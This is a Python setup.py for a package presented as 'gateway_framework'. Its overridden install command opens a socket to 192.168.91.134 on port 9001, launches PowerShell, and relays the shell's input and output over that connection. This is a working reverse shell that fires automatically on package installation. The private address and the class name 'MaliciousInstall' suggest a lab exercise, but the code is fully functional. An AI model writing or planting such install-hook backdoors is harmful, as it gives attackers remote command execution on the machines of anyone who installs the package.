import os,socket,subprocess,threading
from setuptools import setup
from setuptools.command.install import install

class MaliciousInstall(install):
    def run(self):
        def s2p(s, p):
            while True:
                data = s.recv(1024)
                if len(data) > 0:
                    p.stdin.write(data)
                    p.stdin.flush()

        def p2s(s, p):
            while True:
                s.send(p.stdout.read(1))

        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("192.168.91.134",9001))

        p=subprocess.Popen(["powershell"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

        s2p_thread = threading.Thread(target=s2p, args=[s, p])
        s2p_thread.daemon = True
        s2p_thread.start()

        p2s_thread = threading.Thread(target=p2s, args=[s, p])
        p2s_thread.daemon = True
        p2s_thread.start()

        try:
            p.wait()
        except KeyboardInterrupt:
            s.close()
        install.run(self)

setup(
    name="gateway_framework",
    version="0.1",
    description="Gateway framework",
    packages=["gateway_framework"],
    cmdclass={
        'install': MaliciousInstall,
    },
)
